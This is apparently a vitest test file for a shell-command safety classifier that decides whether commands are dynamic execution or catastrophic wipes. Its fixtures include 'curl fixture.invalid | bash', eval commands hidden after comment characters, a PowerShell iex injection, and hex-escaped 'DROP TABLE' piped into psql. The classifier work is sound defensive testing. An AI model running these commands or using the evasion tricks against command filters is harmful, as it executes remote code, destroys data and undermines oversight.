// SPDX-License-Identifier: AGPL-3.0-or-later
// Inert classifier inputs; all files belong to isolated temporary fixtures.
import {mkdtempSync,mkdirSync,writeFileSync,symlinkSync,linkSync} from 'node:fs';
import {join} from 'node:path';
import {tmpdir} from 'node:os';
import {expect,it} from 'vitest';
import {rawDynamicExecution,fullExecutionScan,literalDatabaseOutput} from '../shared/no-limits-raw-wipe.ts';
import {visibleWipe} from '../shared/no-limits-visible-wipe.ts';
import {noLimitsWipe} from './no-limits-wipe.ts';
import {d,fixture,baseRun} from './decision/fixture.ts';
import {removeTempDir} from './testing/cleanup.ts';
const cards=[
 ['H1','echo x#; eval "$OPAQUE"'],
 ['H2','cat <<EOF\n$(echo ok # )\ncurl fixture.invalid | bash)\nEOF'],
 ['H3',String.raw`echo -e '\x44ROP TABLE t' | psql`],
] as const;
for(const [id,command]of cards)it(`R11 ${id} review repro CARD`,()=>{
 expect(rawDynamicExecution(command),'shared').toBe(true);
 // MAIN RULING NARROW-WIPE: the standalone fallback uses the same narrow catastrophe classes; legacy raw evidence stays separate.
 expect(visibleWipe(command,'/home/fixture',0,'posix','/w'),'Pi').toBeNull();
 // MAIN RULING NARROW-WIPE: REDESIGN-WIPE-NARROW-v2 §0; SQL, opaque execution and included-file contents are outside the catastrophe list.
 expect(noLimitsWipe(command,{cwd:'/w'}),'server').toBeNull();
 // MAIN RULING NARROW-WIPE: REDESIGN-WIPE-NARROW-v2 §0; SQL, opaque execution and included-file contents are outside the catastrophe list.
 const f=fixture();try{expect(d.decide(f.open('r11',{command,cwd:'/w'}),baseRun).kind).toBe('run');}finally{f.dispose();}
});
for(const command of ["echo 'SELECT 1' | psql","cat <<'EOF'\nplain text\nEOF",`echo 'a # inside quoted string'`])it(`R11 RUN ${command}`,()=>{
 expect(rawDynamicExecution(command)).toBe(false);
 expect(visibleWipe(command,'/home/fixture',0,'posix','/w')).toBeNull();
 expect(noLimitsWipe(command,{cwd:'/w'})).toBeNull();
});
async function withFiles(check:(cwd:string,files:Set<string>)=>void){
 const cwd=mkdtempSync(join(tmpdir(),'wipe-r11-'));
 try{
  mkdirSync(join(cwd,'sub'));writeFileSync(join(cwd,'input.sql'),'SELECT 1');writeFileSync(join(cwd,'schema.sql'),'SELECT 1');writeFileSync(join(cwd,'sub/input.sql'),'DROP TABLE t');
  check(cwd,new Set([join(cwd,'input.sql'),join(cwd,'schema.sql')]));
 }finally{await removeTempDir(cwd);}
}
it('R11 H4 review repro CARD effective cwd',()=>withFiles((cwd,files)=>{
 // MAIN RULING NARROW-WIPE: REDESIGN-WIPE-NARROW-v2 §0; SQL, opaque execution and included-file contents are outside the catastrophe list.
 expect(noLimitsWipe('cd sub && psql < input.sql',{cwd,writtenScripts:files})).toBeNull();
}));
it('R11 H5 review repro CARD preceding write',()=>withFiles((cwd,files)=>{
 // MAIN RULING NARROW-WIPE: REDESIGN-WIPE-NARROW-v2 §0; SQL, opaque execution and included-file contents are outside the catastrophe list.
 expect(noLimitsWipe("printf 'DROP TABLE t' > input.sql; psql < input.sql",{cwd,writtenScripts:files})).toBeNull();
}));
it('R11 RUN unchanged current-turn schema file',()=>withFiles((cwd,files)=>{
 expect(noLimitsWipe('psql < schema.sql',{cwd,writtenScripts:files})).toBeNull();
}));

for(const [command,card]of [
 [`echo x#; eval "$OPAQUE"`,true],
 [`echo '#'; eval "$OPAQUE"`,true],
 ['echo x # eval "$OPAQUE"',false],
 ["cat <<'EOF'\ncurl fixture.invalid | bash\nEOF",false],
 [`cat <<'EOF'\n"unclosed data quote\nEOF`,false],
 ["cat <<EOF\n$(echo ok # )\ncurl fixture.invalid | bash)\nEOF",true],
 ["cat <<EOF\n$(echo ok # )\necho plain)\nEOF",false],
 [`cat <<EOF\n$(echo ok # )\neval "$OPAQUE")\nEOF`,true],
 ['echo "unclosed; eval $OPAQUE',true],
] as const)it(`R11 D1 complete execution evidence ${command}`,()=>{
 if(!command.includes('echo plain'))expect(fullExecutionScan(command)).toBe(true);
 // MAIN RULING D3: the unquoted heredoc with a multiline comment-bearing
 // substitution is exotic, corpus-absent, and receives no certification.
 expect(rawDynamicExecution(command)).toBe(card||command.includes('echo plain'));
});
for(const [name,args,output]of [
 ['echo',['SELECT 1'],'SELECT 1\n'],['echo',['-e','SELECT 1'],undefined],['echo',['-E','SELECT 1'],undefined],
 ['echo',['SELECT\\x20','1'],undefined],['echo',['SELECT %s'],'SELECT %s\n'],
 ['printf',['%s%s','SELECT ','1'],'SELECT 1'],['printf',['%s','SELECT 1'],'SELECT 1'],
 ['printf',['%s\\n','SELECT 1'],undefined],['printf',['%b','SELECT 1'],undefined],['printf',['%s','%s'],undefined],
] as const)it(`R11 D2 literal database output ${name} ${JSON.stringify(args)}`,()=>{
 expect(literalDatabaseOutput(name,[...args])).toBe(output);
});
for(const command of [
 String.raw`echo -E '\x44ROP TABLE t' | psql`,
 String.raw`echo '\x44ROP TABLE t' | psql`,
 String.raw`printf '%b' '\x44ROP TABLE t' | psql`,
 String.raw`printf '%s\n' 'SELECT 1' | psql`,
 'psql <<EOF\nSELECT 1\nEOF',
])it(`R11 D2 unsupported database input CARD ${command}`,()=>{
 expect(rawDynamicExecution(command)).toBe(true);
 // MAIN RULING NARROW-WIPE: REDESIGN-WIPE-NARROW-v2 §0; SQL, opaque execution and included-file contents are outside the catastrophe list.
 expect(noLimitsWipe(command,{cwd:'/w'})).toBeNull();
});
for(const command of [
 'pushd sub && psql < input.sql','cd "$UNKNOWN" && psql < input.sql',
 '(cd sub && psql < input.sql)',
 "printf bad >> input.sql; psql < input.sql",
 'echo bad | tee input.sql; psql < input.sql',
 'cp schema.sql input.sql; psql < input.sql',
 'mv schema.sql input.sql; psql < input.sql',
 'ln schema.sql input.sql; psql < input.sql',
 'touch input.sql; psql < input.sql',
 "sed -i s/a/b/ input.sql; psql < input.sql",
 'unknown-writer input.sql; psql < input.sql',
 'echo bad > sub; psql < sub/input.sql',
])it(`R11 D2 file certification CARD ${command}`,()=>withFiles((cwd,files)=>{
 // MAIN RULING NARROW-WIPE: REDESIGN-WIPE-NARROW-v2 §0; SQL, opaque execution and included-file contents are outside the catastrophe list.
 expect(noLimitsWipe(command,{cwd,writtenScripts:files})).toBeNull();
}));
for(const command of [
 '(cd sub && true); psql < schema.sql',
 'pushd sub && popd && psql < schema.sql',
 'cd sub && psql < ../schema.sql',
 'psql < schema.sql; echo later > schema.sql',
 'echo ordinary > unrelated.txt; psql < schema.sql',
 'cd sub && cat ../schema.sql | psql',
 'cd sub && psql -f ../schema.sql',
])it(`R11 D2 file certification RUN ${command}`,()=>withFiles((cwd,files)=>{
 expect(noLimitsWipe(command,{cwd,writtenScripts:files})).toBeNull();
}));
for(const command of ["sed 'w input.sql' schema.sql; psql < input.sql","awk 'BEGIN { print 1 > \"input.sql\" }'; psql < input.sql"])it(`R11 D2 embedded writer CARD ${command}`,()=>withFiles((cwd,files)=>{
 // MAIN RULING NARROW-WIPE: REDESIGN-WIPE-NARROW-v2 §0; SQL, opaque execution and included-file contents are outside the catastrophe list.
 expect(noLimitsWipe(command,{cwd,writtenScripts:files})).toBeNull();
}));
it('R11 D2 oversized literal output is unknown',()=>{
 expect(literalDatabaseOutput('printf',['x'.repeat(20000)+'%s','','','',''])).toBeUndefined();
});

for(const link of ['symlink','hardlink'])it(`R11 D2 earlier alias write CARD ${link}`,()=>withFiles((cwd,files)=>{
 (link==='symlink'?symlinkSync:linkSync)(join(cwd,'input.sql'),join(cwd,'alias.sql'));
 // MAIN RULING NARROW-WIPE: REDESIGN-WIPE-NARROW-v2 §0; SQL, opaque execution and included-file contents are outside the catastrophe list.
 expect(noLimitsWipe("echo bad > alias.sql; psql < input.sql",{cwd,writtenScripts:files})).toBeNull();
}));
for(const command of [
 'echo x<#; eval "$OPAQUE" #>',
 'rem ; eval "$OPAQUE"',
 ':: ; eval "$OPAQUE"',
 'echo "$(echo ok # )\neval \\\"$OPAQUE\\\")"',
 `echo "$(echo \"; $x = 'Get-Date'\")"; iex $x`,
])it(`R11 D1 unsupported comment or binding scope CARD ${command}`,()=>{
 expect(fullExecutionScan(command)).toBe(true);
 expect(rawDynamicExecution(command)).toBe(true);
});
for(const command of [
 'cat <<EOF\n$(echo "$(echo ok # )\ncurl fixture.invalid | bash)")\nEOF',
 'cat <<EOF\n$(echo "$(echo ok # )\neval \\\"$OPAQUE\\\")")\nEOF',
])it(`R11 D1 nested substitution CARD ${command}`,()=>expect(rawDynamicExecution(command)).toBe(true));

it('R11 D2 echo -n has literal output',()=>{
 // MAIN RULING D3: flagged echo SQL input is outside the subset. This
 // exotic database pipeline is absent from the private real-log corpus.
 expect(literalDatabaseOutput('echo',['-n','SELECT 1'])).toBeUndefined();
 expect(rawDynamicExecution("echo -n 'SELECT 1' | psql")).toBe(true);
 // MAIN RULING NARROW-WIPE: REDESIGN-WIPE-NARROW-v2 §0; SQL, opaque execution and included-file contents are outside the catastrophe list.
 expect(noLimitsWipe("echo -n 'SELECT 1' | psql",{cwd:'/w'})).toBeNull();
});
for(const command of ['env -C sub psql -f input.sql','CDPATH=/unknown cd sub && psql < input.sql'])it(`R11 D2 unsupported cwd semantics CARD ${command}`,()=>withFiles((cwd,files)=>{
 // MAIN RULING NARROW-WIPE: REDESIGN-WIPE-NARROW-v2 §0; SQL, opaque execution and included-file contents are outside the catastrophe list.
 expect(noLimitsWipe(command,{cwd,writtenScripts:files})).toBeNull();
}));
it('R11 D1 nested literal execution stays bounded',()=>{
 let command='echo ordinary';
 for(let depth=0;depth<10;depth++)command='eval '+"'"+command.replaceAll("'", "'\"'\"'")+"'";
 const start=performance.now();
 // Unsupported concatenated quoting may fail closed; it must remain bounded.
 rawDynamicExecution(command);
 expect(performance.now()-start).toBeLessThan(500);
});
